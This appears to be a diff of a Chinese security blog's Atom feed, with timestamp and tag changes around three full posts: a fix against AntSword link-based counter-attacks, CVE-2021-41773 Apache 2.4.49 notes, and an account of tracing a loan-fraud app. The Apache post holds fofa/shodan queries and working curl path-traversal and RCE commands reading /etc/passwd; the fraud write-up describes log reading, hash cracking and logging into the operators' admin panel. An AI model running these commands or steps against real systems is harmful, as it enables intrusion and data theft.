@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://h3art3ars.github.io/"/>
-  <updated>2022-04-14T05:22:32.889Z</updated>
+  <updated>2022-05-24T14:39:47.481Z</updated>
   <id>http://h3art3ars.github.io/</id>
   
   <author>
@@ -21,7 +21,7 @@
     <link href="http://h3art3ars.github.io/2022/04/14/%E9%98%B2%E8%9A%81%E5%89%91%E5%8F%8D%E5%88%B6%E9%85%8D%E7%BD%AE/"/>
     <id>http://h3art3ars.github.io/2022/04/14/%E9%98%B2%E8%9A%81%E5%89%91%E5%8F%8D%E5%88%B6%E9%85%8D%E7%BD%AE/</id>
     <published>2022-04-14T05:05:47.000Z</published>
-    <updated>2022-04-14T05:22:32.889Z</updated>
+    <updated>2022-05-24T14:39:47.481Z</updated>
     
     <content type="html"><![CDATA[<h1 id="防蚁剑反制配置"><a href="#防蚁剑反制配置" class="headerlink" title="防蚁剑反制配置"></a>防蚁剑反制配置</h1><h2 id="反制蚁剑文章"><a href="#反制蚁剑文章" class="headerlink" title="反制蚁剑文章"></a>反制蚁剑文章</h2><ul><li><p><a href="https://mp.weixin.qq.com/s/WNv9nPWvKudwimtYTd1zDQ" target="_blank" rel="noopener">端内钓鱼，反制蚁剑</a></p><p>分析蚁剑连接时的流量特征，通过测试连接性，最后在终端报错出url，并点击，让受害者点击然后上线cs。</p></li><li><p><a href="https://www.freebuf.com/articles/web/292724.html" target="_blank" rel="noopener">关于蚁剑反制深入的分析和利用</a></p><p>分析蚁剑连接时的流量特征， 读取文件和目录都没有问题，常见的命令执行没有问题，但是上传下载显示连通性出现问题 ，在终端报错出url，让受害者点击上线cs。</p></li></ul><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>antsword的虚拟终端采用的是<a href="">jquery.terminal</a>,版本为1.1.1。css与js文件 在 <code>antSword-master\static\libs\terminal</code>目录。在遇到链接和电子邮件时会自动将其转换成a标签。点击链接后,antsword会用自身的浏览器模块加载恶意js文件。</p><p><img src="/images/image-20220414131505475.png" alt="生成a标签"></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>最新版本的 jquery.terminal已经修复了自动将终端的链接和邮件地址转换成a标签，但是antsword的js不向上兼容，只能手动修改js代码。</p><p>打开  <code>antSword-master/static/libs/terminal/js/jquery.terminal-min-1.1.1.js</code></p><p><img src="/images/image-20220414131547000.png" alt="convertlinks配置代码"></p><p>寻找 <code>convertLinks:true</code> 字段 ，将自动转换配置改为 <code>convertLinks:false</code>。重启antsword后的命令行终端就不会自动将链接转换为a标签了。</p><p><img src="/images/image-20220414131632680.png" alt="修改配置后"></p><p>而且最新版的antsword好像修复了，点击链接会调用浏览器打开而不是antsword自身的浏览器模块。</p>]]></content>
     
@@ -48,7 +48,7 @@
     <link href="http://h3art3ars.github.io/2021/11/24/Apache-HTTP-Server%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
     <id>http://h3art3ars.github.io/2021/11/24/Apache-HTTP-Server%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</id>
     <published>2021-11-24T12:49:47.000Z</published>
-    <updated>2022-05-24T14:12:06.181Z</updated>
+    <updated>2022-05-24T14:36:31.761Z</updated>
     
     <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p> Apache httpd Server 2.4.49 版本引入了一个具有路径穿越漏洞的新函数，但需要配合穿越的目录配置 Require all granted，攻击者可利用该漏洞实现路径穿越从而读取任意文件，或者在配置了cgi的httpd程序中执行bash指令，从而有机会控制服务器。 </p><h2 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h2><p><a href="https://www.anquanke.com/post/id/256973" target="_blank" rel="noopener">Apache httpd Server CVE-2021-41773 漏洞分析</a></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>fofa</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">app &#x3D; &quot;apache-server&#x2F;2.4.49&quot;</span></pre></td></tr></table></figure><p>shodan</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">server: Apache&#x2F;2.4.49</span></pre></td></tr></table></figure><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><h3 id="本地文件读取"><a href="#本地文件读取" class="headerlink" title="本地文件读取"></a>本地文件读取</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">curl -s --path-as-is <span class="string">"http://localhost:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"</span></span></pre></td></tr></table></figure><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">curl -s --path-as-is -d &#39;echo Content-Type: text&#x2F;plain; echo; id&#39; &quot;http:&#x2F;&#x2F;localhost:8080&#x2F;cgi-bin&#x2F;.%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;bin&#x2F;sh&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">curl -s --path-as-is &quot;http:&#x2F;&#x2F;localhost:8787&#x2F;cgi-bin&#x2F;.%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;etc&#x2F;passwd&quot;</span></pre></td></tr></table></figure>]]></content>
     
@@ -59,6 +59,10 @@
     </summary>
     
     
+      <category term="漏洞" scheme="http://h3art3ars.github.io/categories/%E6%BC%8F%E6%B4%9E/"/>
+    
+    
+      <category term="漏洞利用" scheme="http://h3art3ars.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
     
   </entry>
   
@@ -144,7 +148,7 @@
     <link href="http://h3art3ars.github.io/2020/09/06/%E4%B8%80%E6%AC%A1%E9%BB%91%E4%BA%A7%E6%BA%AF%E6%BA%90/"/>
     <id>http://h3art3ars.github.io/2020/09/06/%E4%B8%80%E6%AC%A1%E9%BB%91%E4%BA%A7%E6%BA%AF%E6%BA%90/</id>
     <published>2020-09-06T13:33:29.000Z</published>
-    <updated>2020-09-06T13:46:33.840Z</updated>
+    <updated>2022-05-24T14:40:55.169Z</updated>
     
     <content type="html"><![CDATA[<h1 id="记一次黑产溯源"><a href="#记一次黑产溯源" class="headerlink" title="记一次黑产溯源"></a>记一次黑产溯源</h1><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>一个黑产仿冒客户的app，进行贷款诈骗，然后给我的任务就是尽可能的收集证据。</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>客户给了一个app下载链接。</p><p><code>https://dbfgef.app*****.com/</code></p><p>查了一下ip位置，发现是新浪云服务器。</p><p>然后查看了一下下载页面，是一个仿冒应用宝下载页面。</p><p>仔细分析了一下页面，并且爆破了一下目录。</p><p>发现了 <code>/get.php</code>，发现了两个链接。</p><p><img src="/images/image-20200824204053339.png" alt="image-20200824204053339"></p><p>分别为andriod和ios应用。分别存储在其阿里云oss和一个应用分发平台。</p><p><img src="/images/image-20200824204217888.png" alt="image-20200824204217888"></p><p>应用分发脱离了平台，暂时放过。</p><p>分析一下app，下载app，进入app。</p><p><img src="/images/image-20200824204531686.png" alt="image-20200824204531686"></p><p>发现像是webview，抓了一个包，从web端访问，发现可以访问。之后就从web端开始测试了。</p><p>发现有头像上传，尝试文件上传。上传失败。查看url发现其上传的api是由另一台服务器处理的，于时访问此服务器直接发现了一个上传页面。</p><p><img src="/images/image-20200824205053058.png" alt="image-20200824205053058"></p><p>测试了一下，发现其上传后，还是传到阿里云oss，测试了一下，发现上传页面是使用thinkphp框架搭建，但是是5.0.24版本，无法利用。</p><p>继续查看web端，测试报错，发现其使用了thinkphp3.2.3框架开发。尝试访问日志成功。</p><p>在其中发现</p><p><img src="/images/image-20200824205613676.png" alt="image-20200824205613676"></p><p>cmd5解出密码账号密码 <code>1:[空格] [空格] [空格] [空格] [空格] [空格]</code></p><p>但是尝试了日志中的路径，均无法访问后台。猜测应该是前后台分离。</p><p>之后尝试了子域名，域名解析ip，以及同一ip下的域名访问，都没有查到相关信息。</p><p>之后再次尝试网站报错</p><p><img src="/images/image-20200824205838923.png" alt="image-20200824205838923"></p><p>发现其报错目录的域名，和web访问的域名不同。</p><p>尝试访问此域名。</p><p><img src="/images/image-20200824210144929.png" alt="image-20200824210144929"></p><p>是一个ios下载页面，测试了一下，没有什么功能，就提供了一个页面和下载链接。</p><p>之后再次尝试此域名的子域名，相关域名，同ip的域名。多番验证，找到这个页面。</p><p><img src="/images/image-20200824210920283.png" alt="image-20200824210920283"></p><p>直觉告诉我这是他们的后台。尝试上面得到的账号密码登录。成功登录。</p><p><img src="/images/image-20200824210608479.png" alt="image-20200824210608479"></p><p>看了一下信息，发现有之前在app注册的账号，再次证明为目标后台。之后后台尝试拿shell，未成功。</p><p>至此信息收集结束，打包交给客户。</p><p>然后过了一段时间，发现除了前台和后台，其他的站还好好的。</p><p><img src="/images/image-20200824210830301.png" alt="image-20200824210830301"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>渗透测试的本质还是信息收集，收集的范围，和目标相关联的资产越多，测试下来能发现的漏洞就越多。还有就是违法的事情不能做，不然动了别人的利益，哪里都跑不掉。</p>]]></content>
     
@@ -155,12 +159,12 @@
     </summary>
     
     
-      <category term="信息收集" scheme="http://h3art3ars.github.io/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
-    
-      <category term="溯源" scheme="http://h3art3ars.github.io/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E6%BA%AF%E6%BA%90/"/>
+      <category term="溯源" scheme="http://h3art3ars.github.io/categories/%E6%BA%AF%E6%BA%90/"/>
     
     
       <category term="信息收集" scheme="http://h3art3ars.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
+    
+      <category term="溯源" scheme="http://h3art3ars.github.io/tags/%E6%BA%AF%E6%BA%90/"/>
     
   </entry>
   
